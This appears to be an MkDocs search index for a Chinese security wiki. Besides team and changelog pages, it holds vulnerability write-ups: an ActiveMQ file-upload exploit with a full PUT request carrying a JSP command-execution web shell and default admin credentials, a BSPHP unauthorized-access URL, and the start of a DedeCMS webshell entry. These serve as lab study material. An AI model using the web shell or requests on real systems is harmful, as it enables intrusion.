{"config":{"lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"","title":"\u9996\u9875"},{"location":"%E5%9B%A2%E9%98%9F%E4%BB%8B%E7%BB%8D/","text":"\u56e2\u961f\u4ecb\u7ecd \u00b6 \u5c0a\u656c\u7684\u767d\u5ba2\uff0c\u6b22\u8fce\u6765\u5230\u767d\u9601\u3002\u6280\u672f\u83b7\u53d6\u65e0\u9700\u6761\u6761\u6846\u6846\uff0c\u5f00\u6e90\u624d\u662f\u771f\u6b63\u5171\u4eab\u3002 \u6ce8\u610f\u4e8b\u9879 \u00b6 \u767d\u9601\u6587\u5e93\u73b0\u5df2\u6c38\u4e45\u5f00\u6e90\u81f3Github,\u65e0\u9700\u6ce8\u518c\uff0c\u8868\u54e5\u4eec\u53ef\u4e0b\u8f7d\u81f3\u672c\u5730\u5df2\u6ee1\u8db3\u5236\u4f5c\u5de5\u5177\u7b49\u9700\u6c42 \u65e0\u9700\u6c42\u7684\u8868\u54e5\u53ef\u968f\u65f6\u8bbf\u95ee\u6587\u5e93\u7f51\u7ad9\u67e5\u9605 \u767d\u9601\u6587\u5e93\u5730\u5740\uff1a https://wiki.bylibrary.cn Github\u5730\u5740\uff1a https://github.com/BaizeSec/bylibrary \u6295\u7a3f\u90ae\u7bb1\uff1aByLibrary@163.com\u6216\u76f4\u63a5\u5728github Pull requests \u6587\u5e93\u6bcf\u5929\u5b9e\u65f6\u66f4\u65b0\uff0c\u6b22\u8fce\u5404\u4f4d\u5b89\u5168\u56e2\u961f\u548c\u767d\u5e3d\u5b50\u52a0\u5165\u6211\u4eec\u7684\u516c\u76ca\u4e8b\u4e1a \u6709\u5174\u8da3\u7684\u8868\u54e5\u53ef\u5fae\u4fe1\u5173\u6ce8\u516c\u4f17\u53f7\u201c\u767d\u6cfdSec\u201d\u4e86\u89e3\u66f4\u591a\u6280\u672f\u5185\u5bb9 \u60f3\u5165\u4ea4\u6d41\u7fa4\u7684\u8868\u54e5\u6dfb\u52a0\u8fd0\u8425\u5c0f\u59d0\u59d0\u5fae\u4fe1\uff1aEcho-630- \u6587\u5e93\u7ef4\u62a4\u56e2\u961f \u00b6 \u652f\u6301\u56e2\u961f \u00b6 \u652f\u6301\u767d\u5e3d\u5b50 \u00b6 \u611f\u8c22\u4ee5\u4e0b\u767d\u5ba2\u5bf9\u4e8e\u767d\u9601\u6587\u5e93\u7684\u8d21\u732e\uff1a \uff08\u6392\u540d\u4e0d\u5206\u5148\u540e\uff09 \u798f\u6797\u8868\u54e5\u3001x77\u3001\u963f\u4e50\u3001Le\u3001Lx\u3001mys3t\u3001hps_fly\u3001NickName\u3001return0\u3001loveU\u3001m_ing\u3001aaaahui\u3001Wizard\u3001P1kAju \u9519\u8bef\u4fee\u6539 \u00b6 \u5173\u4e8e\u9875\u9762\u51fa\u73b0\u7684\u9519\u8bef\uff0c\u53ef\u4ee5\u76f4\u63a5\u5728\u6240\u5728\u9875\u9762\u53f3\u4e0a\u89d2\u70b9\u51fb \ud83d\udd8a \u7b26\u53f7\u8fdb\u884c\u4fee\u6539\u63d0\u4ea4\u3002 \u8d21\u732e\u6307\u5357 \u00b6 \u8d21\u732e\u6587\u6863\u8981\u6c42 \u00b6 \u5f53\u4f60\u6253\u7b97\u8d21\u732e\u67d0\u90e8\u5206\u7684\u5185\u5bb9\u65f6\uff0c\u4f60\u5e94\u8be5\u5c3d\u91cf\u786e\u4fdd \u6587\u6863\u5185\u5bb9\u6ee1\u8db3\u57fa\u672c\u683c\u5f0f\u8981\u6c42 \u6587\u6863\u7684\u5408\u7406\u6027\u4ee5\u53ca\u51c6\u786e\u6027 \u6587\u6863\u56fe\u7247\u4ee5\u53ca\u9644\u4ef6\u7684\u5b58\u50a8\u683c\u5f0f \u6587\u6863\u5b58\u50a8\u683c\u5f0f \u00b6 1.\u76ee\u524d\u4ed3\u5e93\u53ea\u63a5\u53d7 Markdown \u683c\u5f0f\u7684\u8d21\u732e\u63d0\u4ea4\uff0c\u5982\u679c\u6709\u5176\u4ed6\u683c\u5f0f\u7684\u63d0\u4ea4\u8bf7\u8054\u7cfb\u6211\u4eec\u8fdb\u884c\u8f6c\u6362\u3002 2.\u6587\u7ae0\u5185\u56fe\u7247\u5b58\u50a8\u8981\u6c42\uff1a\u5982\u679c\u6587\u7ae0\u5185\u6709\u56fe\u7247\u6f14\u793a\u7b49\uff0c\u5e94\u5c06\u56fe\u7247\u653e\u5728\u672c\u5730\uff0c\u907f\u514d\u4f7f\u7528\u5916\u94fe\u3002\u63a8\u8350\u4f7f\u7528\u76f8\u5bf9\u8def\u5f84\u8fdb\u884c\u56fe\u7247\u7d22\u5f15\u94fe\u63a5\uff0c\u590d\u5236\u56fe\u7247\u5230\u4e0e\u5f53\u524d\u6587\u6863\u540c\u540d\u7684\u6587\u4ef6\u5939\u4e0b\uff0c\u6216\u53ef\u76f4\u63a5\u5728 MarkDown \u8f6f\u4ef6\u4e2d\u8bbe\u7f6e\u590d\u5236\u56fe\u7247\u5230\u6307\u5b9a\u8def\u5f84\uff0c\u56fe\u7247\u5b58\u50a8\u4f4d\u7f6e\u7b56\u7565\u4ee3\u7801\u5982\u4e0b\uff1a ./${filename} \u5176\u4e2d ./${filename} \u8868\u793a\u5f53\u524d\u6587\u4ef6\u540d\uff0c\u5177\u4f53\u6848\u4f8b\u6f14\u793a\u5982\u4e0b\uff1a \u5047\u8bbe\u6211\u6709\u4e00\u7bc7\u540d\u4e3a xss \u6280\u672f\u603b\u7ed3.md \u7684\u6587\u7ae0\uff0c\u91cc\u9762\u6709\u82e5\u5e72\u56fe\u7247\uff0c\u90a3\u4e48\u56fe\u7247\u5e94\u8be5\u5b58\u50a8\u5728 xss \u6280\u672f\u603b\u7ed3 \u8fd9\u4e2a\u6587\u4ef6\u5939\u5185\uff0c\u63d0\u4ea4\u65f6\u5e94\u5f53\u5c06\u6b64\u6587\u4ef6\u5939\u548c .md \u6587\u4ef6\u4e00\u540c\u63d0\u4ea4\u3002 \u5173\u4e8e\u6587\u5e93 \u00b6 \u767d\u9601\u6587\u5e93\u6587\u7ae0\u5747\u6765\u81ea\u7f51\u7edc\u6587\u7ae0\u7efc\u5408\u548c\u56e2\u961f\u539f\u521b\uff0c\u5bf9\u4e8e\u6709\u53ef\u6eaf\u6765\u6e90\u7684\u6587\u7ae0\u6211\u4eec\u5c06\u4f1a\u6ce8\u660e\u6765\u6e90\uff0c\u5bf9\u5f15\u7528\u53c2\u8003\u5185\u5bb9\u7684\u6587\u7ae0\uff0c\u6211\u4eec\u5c06\u4f1a\u5728\u6bcf\u7bc7\u6587\u7ae0\u672b\u6807\u6ce8\u5f15\u7528\u53c2\u8003\u6765\u6e90\u3002\u5982\u6709\u6587\u7ae0\u6765\u6e90\u548c\u53c2\u8003\u94fe\u63a5\u66f4\u65b0\u4e0d\u53ca\u65f6\u7684\u60c5\u51b5\uff0c\u8bf7\u5404\u4f4d\u53ca\u65f6\u6279\u8bc4\u6307\u6b63\u3002 \u5173\u4e8e\u767d\u9601\u6587\u5e93\u7684\u6587\u7ae0\uff0c\u76ee\u524d\u6b63\u5728\u4e0d\u65ad\u7684\u8fdb\u884c\u66f4\u65b0\u6269\u5145\u4e2d...","title":"\u56e2\u961f\u4ecb\u7ecd"},{"location":"%E5%9B%A2%E9%98%9F%E4%BB%8B%E7%BB%8D/#_1","text":"\u5c0a\u656c\u7684\u767d\u5ba2\uff0c\u6b22\u8fce\u6765\u5230\u767d\u9601\u3002\u6280\u672f\u83b7\u53d6\u65e0\u9700\u6761\u6761\u6846\u6846\uff0c\u5f00\u6e90\u624d\u662f\u771f\u6b63\u5171\u4eab\u3002","title":"\u56e2\u961f\u4ecb\u7ecd"},{"location":"%E5%9B%A2%E9%98%9F%E4%BB%8B%E7%BB%8D/#_2","text":"\u767d\u9601\u6587\u5e93\u73b0\u5df2\u6c38\u4e45\u5f00\u6e90\u81f3Github,\u65e0\u9700\u6ce8\u518c\uff0c\u8868\u54e5\u4eec\u53ef\u4e0b\u8f7d\u81f3\u672c\u5730\u5df2\u6ee1\u8db3\u5236\u4f5c\u5de5\u5177\u7b49\u9700\u6c42 \u65e0\u9700\u6c42\u7684\u8868\u54e5\u53ef\u968f\u65f6\u8bbf\u95ee\u6587\u5e93\u7f51\u7ad9\u67e5\u9605 \u767d\u9601\u6587\u5e93\u5730\u5740\uff1a https://wiki.bylibrary.cn Github\u5730\u5740\uff1a https://github.com/BaizeSec/bylibrary \u6295\u7a3f\u90ae\u7bb1\uff1aByLibrary@163.com\u6216\u76f4\u63a5\u5728github Pull requests \u6587\u5e93\u6bcf\u5929\u5b9e\u65f6\u66f4\u65b0\uff0c\u6b22\u8fce\u5404\u4f4d\u5b89\u5168\u56e2\u961f\u548c\u767d\u5e3d\u5b50\u52a0\u5165\u6211\u4eec\u7684\u516c\u76ca\u4e8b\u4e1a \u6709\u5174\u8da3\u7684\u8868\u54e5\u53ef\u5fae\u4fe1\u5173\u6ce8\u516c\u4f17\u53f7\u201c\u767d\u6cfdSec\u201d\u4e86\u89e3\u66f4\u591a\u6280\u672f\u5185\u5bb9 \u60f3\u5165\u4ea4\u6d41\u7fa4\u7684\u8868\u54e5\u6dfb\u52a0\u8fd0\u8425\u5c0f\u59d0\u59d0\u5fae\u4fe1\uff1aEcho-630-","title":"\u6ce8\u610f\u4e8b\u9879"},{"location":"%E5%9B%A2%E9%98%9F%E4%BB%8B%E7%BB%8D/#_3","text":"","title":"\u6587\u5e93\u7ef4\u62a4\u56e2\u961f"},{"location":"%E5%9B%A2%E9%98%9F%E4%BB%8B%E7%BB%8D/#_4","text":"","title":"\u652f\u6301\u56e2\u961f"},{"location":"%E5%9B%A2%E9%98%9F%E4%BB%8B%E7%BB%8D/#_5","text":"\u611f\u8c22\u4ee5\u4e0b\u767d\u5ba2\u5bf9\u4e8e\u767d\u9601\u6587\u5e93\u7684\u8d21\u732e\uff1a \uff08\u6392\u540d\u4e0d\u5206\u5148\u540e\uff09 \u798f\u6797\u8868\u54e5\u3001x77\u3001\u963f\u4e50\u3001Le\u3001Lx\u3001mys3t\u3001hps_fly\u3001NickName\u3001return0\u3001loveU\u3001m_ing\u3001aaaahui\u3001Wizard\u3001P1kAju","title":"\u652f\u6301\u767d\u5e3d\u5b50"},{"location":"%E5%9B%A2%E9%98%9F%E4%BB%8B%E7%BB%8D/#_6","text":"\u5173\u4e8e\u9875\u9762\u51fa\u73b0\u7684\u9519\u8bef\uff0c\u53ef\u4ee5\u76f4\u63a5\u5728\u6240\u5728\u9875\u9762\u53f3\u4e0a\u89d2\u70b9\u51fb \ud83d\udd8a \u7b26\u53f7\u8fdb\u884c\u4fee\u6539\u63d0\u4ea4\u3002","title":"\u9519\u8bef\u4fee\u6539"},{"location":"%E5%9B%A2%E9%98%9F%E4%BB%8B%E7%BB%8D/#_7","text":"","title":"\u8d21\u732e\u6307\u5357"},{"location":"%E5%9B%A2%E9%98%9F%E4%BB%8B%E7%BB%8D/#_8","text":"\u5f53\u4f60\u6253\u7b97\u8d21\u732e\u67d0\u90e8\u5206\u7684\u5185\u5bb9\u65f6\uff0c\u4f60\u5e94\u8be5\u5c3d\u91cf\u786e\u4fdd \u6587\u6863\u5185\u5bb9\u6ee1\u8db3\u57fa\u672c\u683c\u5f0f\u8981\u6c42 \u6587\u6863\u7684\u5408\u7406\u6027\u4ee5\u53ca\u51c6\u786e\u6027 \u6587\u6863\u56fe\u7247\u4ee5\u53ca\u9644\u4ef6\u7684\u5b58\u50a8\u683c\u5f0f","title":"\u8d21\u732e\u6587\u6863\u8981\u6c42"},{"location":"%E5%9B%A2%E9%98%9F%E4%BB%8B%E7%BB%8D/#_9","text":"1.\u76ee\u524d\u4ed3\u5e93\u53ea\u63a5\u53d7 Markdown \u683c\u5f0f\u7684\u8d21\u732e\u63d0\u4ea4\uff0c\u5982\u679c\u6709\u5176\u4ed6\u683c\u5f0f\u7684\u63d0\u4ea4\u8bf7\u8054\u7cfb\u6211\u4eec\u8fdb\u884c\u8f6c\u6362\u3002 2.\u6587\u7ae0\u5185\u56fe\u7247\u5b58\u50a8\u8981\u6c42\uff1a\u5982\u679c\u6587\u7ae0\u5185\u6709\u56fe\u7247\u6f14\u793a\u7b49\uff0c\u5e94\u5c06\u56fe\u7247\u653e\u5728\u672c\u5730\uff0c\u907f\u514d\u4f7f\u7528\u5916\u94fe\u3002\u63a8\u8350\u4f7f\u7528\u76f8\u5bf9\u8def\u5f84\u8fdb\u884c\u56fe\u7247\u7d22\u5f15\u94fe\u63a5\uff0c\u590d\u5236\u56fe\u7247\u5230\u4e0e\u5f53\u524d\u6587\u6863\u540c\u540d\u7684\u6587\u4ef6\u5939\u4e0b\uff0c\u6216\u53ef\u76f4\u63a5\u5728 MarkDown \u8f6f\u4ef6\u4e2d\u8bbe\u7f6e\u590d\u5236\u56fe\u7247\u5230\u6307\u5b9a\u8def\u5f84\uff0c\u56fe\u7247\u5b58\u50a8\u4f4d\u7f6e\u7b56\u7565\u4ee3\u7801\u5982\u4e0b\uff1a ./${filename} \u5176\u4e2d ./${filename} \u8868\u793a\u5f53\u524d\u6587\u4ef6\u540d\uff0c\u5177\u4f53\u6848\u4f8b\u6f14\u793a\u5982\u4e0b\uff1a \u5047\u8bbe\u6211\u6709\u4e00\u7bc7\u540d\u4e3a xss \u6280\u672f\u603b\u7ed3.md \u7684\u6587\u7ae0\uff0c\u91cc\u9762\u6709\u82e5\u5e72\u56fe\u7247\uff0c\u90a3\u4e48\u56fe\u7247\u5e94\u8be5\u5b58\u50a8\u5728 xss \u6280\u672f\u603b\u7ed3 \u8fd9\u4e2a\u6587\u4ef6\u5939\u5185\uff0c\u63d0\u4ea4\u65f6\u5e94\u5f53\u5c06\u6b64\u6587\u4ef6\u5939\u548c .md \u6587\u4ef6\u4e00\u540c\u63d0\u4ea4\u3002","title":"\u6587\u6863\u5b58\u50a8\u683c\u5f0f"},{"location":"%E5%9B%A2%E9%98%9F%E4%BB%8B%E7%BB%8D/#_10","text":"\u767d\u9601\u6587\u5e93\u6587\u7ae0\u5747\u6765\u81ea\u7f51\u7edc\u6587\u7ae0\u7efc\u5408\u548c\u56e2\u961f\u539f\u521b\uff0c\u5bf9\u4e8e\u6709\u53ef\u6eaf\u6765\u6e90\u7684\u6587\u7ae0\u6211\u4eec\u5c06\u4f1a\u6ce8\u660e\u6765\u6e90\uff0c\u5bf9\u5f15\u7528\u53c2\u8003\u5185\u5bb9\u7684\u6587\u7ae0\uff0c\u6211\u4eec\u5c06\u4f1a\u5728\u6bcf\u7bc7\u6587\u7ae0\u672b\u6807\u6ce8\u5f15\u7528\u53c2\u8003\u6765\u6e90\u3002\u5982\u6709\u6587\u7ae0\u6765\u6e90\u548c\u53c2\u8003\u94fe\u63a5\u66f4\u65b0\u4e0d\u53ca\u65f6\u7684\u60c5\u51b5\uff0c\u8bf7\u5404\u4f4d\u53ca\u65f6\u6279\u8bc4\u6307\u6b63\u3002 \u5173\u4e8e\u767d\u9601\u6587\u5e93\u7684\u6587\u7ae0\uff0c\u76ee\u524d\u6b63\u5728\u4e0d\u65ad\u7684\u8fdb\u884c\u66f4\u65b0\u6269\u5145\u4e2d...","title":"\u5173\u4e8e\u6587\u5e93"},{"location":"%E6%9B%B4%E6%96%B0%E6%97%A5%E5%BF%97/","text":"\u66f4\u65b0\u65e5\u5fd7 \u00b6 2021\u5e7402\u670802\u65e5 \u00b6 \u4e3b\u9898\u7f8e\u5316\u3002 2020\u5e7410\u670827\u65e5 \u00b6 \u767d\u9601\u6587\u5e93V2.0\u7248\u672c\u6b63\u5f0f\u4e0a\u7ebf\uff0c\u6846\u67b6\u66f4\u65b0\u4e3a mkdoc\uff0c\u540c\u65f6\u90e8\u7f72\u4e86 \u56fd\u5185CDN \u8282\u70b9\u4f18\u5316\u8bbf\u95ee\u3002","title":"\u66f4\u65b0\u65e5\u5fd7"},{"location":"%E6%9B%B4%E6%96%B0%E6%97%A5%E5%BF%97/#_1","text":"","title":"\u66f4\u65b0\u65e5\u5fd7"},{"location":"%E6%9B%B4%E6%96%B0%E6%97%A5%E5%BF%97/#20210202","text":"\u4e3b\u9898\u7f8e\u5316\u3002","title":"2021\u5e7402\u670802\u65e5"},{"location":"%E6%9B%B4%E6%96%B0%E6%97%A5%E5%BF%97/#20201027","text":"\u767d\u9601\u6587\u5e93V2.0\u7248\u672c\u6b63\u5f0f\u4e0a\u7ebf\uff0c\u6846\u67b6\u66f4\u65b0\u4e3a mkdoc\uff0c\u540c\u65f6\u90e8\u7f72\u4e86 \u56fd\u5185CDN \u8282\u70b9\u4f18\u5316\u8bbf\u95ee\u3002","title":"2020\u5e7410\u670827\u65e5"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/ActiveMQ/ActiveMQ%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/","text":"ActiveMQ\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e \u00b6 \u8be5\u6f0f\u6d1e\u51fa\u73b0\u5728fileserver\u5e94\u7528\u4e2d,ActiveMQ\u4e2d\u7684fileserver\u670d\u52a1\u5141\u8bb8\u7528\u6237\u901a\u8fc7HTTP PUT\u65b9\u6cd5\u4e0a\u4f20\u6587\u4ef6\u5230\u6307\u5b9a\u76ee\u5f55\u3002Fileserver\u652f\u6301\u5199\u5165\u6587\u4ef6(\u4e0d\u89e3\u6790jsp),\u4f46\u662f\u652f\u6301\u79fb\u52a8\u6587\u4ef6(Move)\u6211\u4eec\u53ef\u4ee5\u5c06jsp\u7684\u6587\u4ef6PUT\u5230Fileserver\u4e0b,\u7136\u540e\u518d\u901a\u8fc7Move\u6307\u4ee4\u79fb\u52a8\u5230\u53ef\u6267\u884c\u76ee\u5f55\u4e0b\u8bbf\u95ee \u4f7f\u7528vulhub\u4e00\u952e\u642d\u5efa\uff0c\u9776\u673akali\uff1a192.168.1771.37 docker-compose up -d \u73af\u5883\u642d\u5efa\u6210\u529f\uff0c\u6d4f\u89c8\u5668\u8bbf\u95ee\uff1a http://IP:8161 \u767b\u5f55admin\u8d26\u53f7\uff1a\u9ed8\u8ba4\u8d26\u53f7admin/admin\uff0c\u6293\u5305\u8fdb\u884c\u4fee\u6539\uff0c\u4f7f\u7528PUT\u65b9\u6cd5\u4e0a\u4f20\u6587\u4ef6\u3002ActiveMQ Web\u63a7\u5236\u53f0\u5206\u4e3a\u4e09\u4e2a\u5e94\u7528\u7a0b\u5e8f\uff1a\u5176\u4e2dadmin\uff0capi\u548cfileserver\uff0c\u5176\u4e2dadmin\u662f\u7ba1\u7406\u5458\u9875\u9762\uff0capi\u662f\u754c\u9762\uff0cfileserver\u662f\u7528\u4e8e\u5b58\u50a8\u6587\u4ef6\u7684\u754c\u9762\uff1badmin\u548capi\u9700\u8981\u5148\u767b\u5f55\u624d\u80fd\u4f7f\u7528\uff0cfileserver\u4e0d\u9700\u8981\u767b\u5f55\u3002 \u4e0a\u4f20jsp\u6587\u4ef6\uff08\u7cfb\u7edf\u4e0d\u7a33\u5b9a\uff0c\u6709\u65f6\u6210\u529f\u6709\u65f6\u5931\u8d25\uff09\uff0c PUT /fileserver/2.jsp HTTP/1.1 Host: 192.168.177.137:8161 User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate DNT: 1 Cookie: JSESSIONID=18wws8yzr1a04iz9gfpkkar3p Authorization: Basic YWRtaW46YWRtaW4= X-Forwarded-For: 8.8.8.8 Connection: close Content-Length: 329 <%@ page import=\"java.io.*\"%> <% out.print(\"Hello</br>\"); String strcmd=request.getParameter(\"cmd\"); String line=null; Process p=Runtime.getRuntime().exec(strcmd); BufferedReader br=new BufferedReader(new InputStreamReader(p.getInputStream())); while((line=br.readLine())!=null){ out.print(line+\"</br>\"); } %> \u4f7f\u7528MOVE\u65b9\u6cd5\u79fb\u52a8\u6587\u4ef6\uff0c\u6210\u529f\u7684\u5305\u6ca1\u622a\u4e0a\uff0c\u518d\u6b21\u4e0a\u4f20\u662f500\u56de\u663e\uff0c\u6587\u4ef6\u5df2\u7ecf\u4e0a\u4f20\u6210\u529f\uff0c\u8bbf\u95ee\u5730\u5740\uff0c\u6210\u529f\u89e3\u6790jsp \u4f7f\u7528MOVE\u65b9\u6cd5\u79fb\u52a8\u6587\u4ef6\uff0c\u6210\u529f\u7684\u5305\u6ca1\u622a\u4e0a\uff0c\u518d\u6b21\u4e0a\u4f20\u662f500\u56de\u663e\uff0c\u6587\u4ef6\u5df2\u7ecf\u4e0a\u4f20\u6210\u529f\uff0c\u8bbf\u95ee\u5730\u5740\uff0c\u6210\u529f\u89e3\u6790jsp \u6f0f\u6d1e\u5f71\u54cd\u7248\u672c\uff1aApache ActiveMQ 5.x ~ 5.14.0 1\u3001ActiveMQ Fileserver \u7684\u529f\u80fd\u5728 5.14.0 \u53ca\u5176\u4ee5\u540e\u7684\u7248\u672c\u4e2d\u5df2\u88ab\u79fb\u9664\u3002\u5efa\u8bae\u7528\u6237\u5347\u7ea7\u81f3 5.14.0 \u53ca\u5176\u4ee5\u540e\u7248\u672c\u3002 2\u3001\u901a\u8fc7\u79fb\u9664 conf\\jetty.xml \u7684\u4ee5\u4e0b\u914d\u7f6e\u6765\u7981\u7528 ActiveMQ Fileserver \u529f\u80fd","title":"ActiveMQ\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/ActiveMQ/ActiveMQ%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/#activemq","text":"\u8be5\u6f0f\u6d1e\u51fa\u73b0\u5728fileserver\u5e94\u7528\u4e2d,ActiveMQ\u4e2d\u7684fileserver\u670d\u52a1\u5141\u8bb8\u7528\u6237\u901a\u8fc7HTTP PUT\u65b9\u6cd5\u4e0a\u4f20\u6587\u4ef6\u5230\u6307\u5b9a\u76ee\u5f55\u3002Fileserver\u652f\u6301\u5199\u5165\u6587\u4ef6(\u4e0d\u89e3\u6790jsp),\u4f46\u662f\u652f\u6301\u79fb\u52a8\u6587\u4ef6(Move)\u6211\u4eec\u53ef\u4ee5\u5c06jsp\u7684\u6587\u4ef6PUT\u5230Fileserver\u4e0b,\u7136\u540e\u518d\u901a\u8fc7Move\u6307\u4ee4\u79fb\u52a8\u5230\u53ef\u6267\u884c\u76ee\u5f55\u4e0b\u8bbf\u95ee \u4f7f\u7528vulhub\u4e00\u952e\u642d\u5efa\uff0c\u9776\u673akali\uff1a192.168.1771.37 docker-compose up -d \u73af\u5883\u642d\u5efa\u6210\u529f\uff0c\u6d4f\u89c8\u5668\u8bbf\u95ee\uff1a http://IP:8161 \u767b\u5f55admin\u8d26\u53f7\uff1a\u9ed8\u8ba4\u8d26\u53f7admin/admin\uff0c\u6293\u5305\u8fdb\u884c\u4fee\u6539\uff0c\u4f7f\u7528PUT\u65b9\u6cd5\u4e0a\u4f20\u6587\u4ef6\u3002ActiveMQ Web\u63a7\u5236\u53f0\u5206\u4e3a\u4e09\u4e2a\u5e94\u7528\u7a0b\u5e8f\uff1a\u5176\u4e2dadmin\uff0capi\u548cfileserver\uff0c\u5176\u4e2dadmin\u662f\u7ba1\u7406\u5458\u9875\u9762\uff0capi\u662f\u754c\u9762\uff0cfileserver\u662f\u7528\u4e8e\u5b58\u50a8\u6587\u4ef6\u7684\u754c\u9762\uff1badmin\u548capi\u9700\u8981\u5148\u767b\u5f55\u624d\u80fd\u4f7f\u7528\uff0cfileserver\u4e0d\u9700\u8981\u767b\u5f55\u3002 \u4e0a\u4f20jsp\u6587\u4ef6\uff08\u7cfb\u7edf\u4e0d\u7a33\u5b9a\uff0c\u6709\u65f6\u6210\u529f\u6709\u65f6\u5931\u8d25\uff09\uff0c PUT /fileserver/2.jsp HTTP/1.1 Host: 192.168.177.137:8161 User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate DNT: 1 Cookie: JSESSIONID=18wws8yzr1a04iz9gfpkkar3p Authorization: Basic YWRtaW46YWRtaW4= X-Forwarded-For: 8.8.8.8 Connection: close Content-Length: 329 <%@ page import=\"java.io.*\"%> <% out.print(\"Hello</br>\"); String strcmd=request.getParameter(\"cmd\"); String line=null; Process p=Runtime.getRuntime().exec(strcmd); BufferedReader br=new BufferedReader(new InputStreamReader(p.getInputStream())); while((line=br.readLine())!=null){ out.print(line+\"</br>\"); } %> \u4f7f\u7528MOVE\u65b9\u6cd5\u79fb\u52a8\u6587\u4ef6\uff0c\u6210\u529f\u7684\u5305\u6ca1\u622a\u4e0a\uff0c\u518d\u6b21\u4e0a\u4f20\u662f500\u56de\u663e\uff0c\u6587\u4ef6\u5df2\u7ecf\u4e0a\u4f20\u6210\u529f\uff0c\u8bbf\u95ee\u5730\u5740\uff0c\u6210\u529f\u89e3\u6790jsp \u4f7f\u7528MOVE\u65b9\u6cd5\u79fb\u52a8\u6587\u4ef6\uff0c\u6210\u529f\u7684\u5305\u6ca1\u622a\u4e0a\uff0c\u518d\u6b21\u4e0a\u4f20\u662f500\u56de\u663e\uff0c\u6587\u4ef6\u5df2\u7ecf\u4e0a\u4f20\u6210\u529f\uff0c\u8bbf\u95ee\u5730\u5740\uff0c\u6210\u529f\u89e3\u6790jsp \u6f0f\u6d1e\u5f71\u54cd\u7248\u672c\uff1aApache ActiveMQ 5.x ~ 5.14.0 1\u3001ActiveMQ Fileserver \u7684\u529f\u80fd\u5728 5.14.0 \u53ca\u5176\u4ee5\u540e\u7684\u7248\u672c\u4e2d\u5df2\u88ab\u79fb\u9664\u3002\u5efa\u8bae\u7528\u6237\u5347\u7ea7\u81f3 5.14.0 \u53ca\u5176\u4ee5\u540e\u7248\u672c\u3002 2\u3001\u901a\u8fc7\u79fb\u9664 conf\\jetty.xml \u7684\u4ee5\u4e0b\u914d\u7f6e\u6765\u7981\u7528 ActiveMQ Fileserver \u529f\u80fd","title":"ActiveMQ\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/BSPHP/BSPHP%E5%AD%98%E5%9C%A8%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/","text":"BSPHP\u5b58\u5728\u672a\u6388\u6743\u8bbf\u95ee \u00b6 \u8be5\u5904\u6cc4\u6f0f\u7684\u2f64\u6237\u540d\u548c\u7528\u6237\u767b\u9646 IP URL\u683c\u5f0f\u5982\u4e0b\uff1a http://127.0.0.1/admin/index.php?m=admin&c=log&a=table_json&json=get&soso_ok=1&t=user_login_log&page=1&limit=10& \u76f4\u63a5\u8fdb\u884c\u8bbf\u95ee\u5373\u53ef\u83b7\u5f97\u5982\u4e0b\u6570\u636e","title":"BSPHP\u5b58\u5728\u672a\u6388\u6743\u8bbf\u95ee"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/BSPHP/BSPHP%E5%AD%98%E5%9C%A8%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/#bsphp","text":"\u8be5\u5904\u6cc4\u6f0f\u7684\u2f64\u6237\u540d\u548c\u7528\u6237\u767b\u9646 IP URL\u683c\u5f0f\u5982\u4e0b\uff1a http://127.0.0.1/admin/index.php?m=admin&c=log&a=table_json&json=get&soso_ok=1&t=user_login_log&page=1&limit=10& \u76f4\u63a5\u8fdb\u884c\u8bbf\u95ee\u5373\u53ef\u83b7\u5f97\u5982\u4e0b\u6570\u636e","title":"BSPHP\u5b58\u5728\u672a\u6388\u6743\u8bbf\u95ee"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/DedeCMS%20V5.7%20SP2%E5%90%8E%E5%8F%B0%E5%AD%98%E5%9C%A8%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/","text":"DedeCMS V5.7 SP2\u540e\u53f0\u5b58\u5728\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e \u00b6 \u5f71\u54cd\u7248\u672c \u00b6 DedeCMS V5.7 SP2 \u6f0f\u6d1e\u7b80\u4ecb \u00b6 \u7ec7\u68a6\u5185\u5bb9\u7ba1\u7406\u7cfb\u7edf(Dedecms)\u662f\u4e00\u6b3ePHP\u5f00\u6e90\u7f51\u7ad9\u7ba1\u7406\u7cfb\u7edf\u3002Dedecms V5.7 SP2\u7248\u672c\u4e2d\u7684tpl.php\u4e2d\u5b58\u5728\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e,\u53ef\u4ee5\u901a\u8fc7\u8be5\u6f0f\u6d1e\u5728\u589e\u52a0\u65b0\u6807\u7b7e\u4e2d\u4e0a\u4f20\u6728\u9a6c,\u83b7\u53d6webshell\u3002\u8be5\u6f0f\u6d1e\u5229\u7528\u9700\u8981\u767b\u5f55\u540e\u53f0,\u5e76\u4e14\u540e\u53f0\u7684\u8d26\u6237\u6743\u9650\u662f\u7ba1\u7406\u5458\u6743\u9650\u3002 \u6f0f\u6d1e\u8be6\u60c5 \u00b6 \u9ed8\u8ba4\u540e\u53f0\u5730\u5740 /dede/ 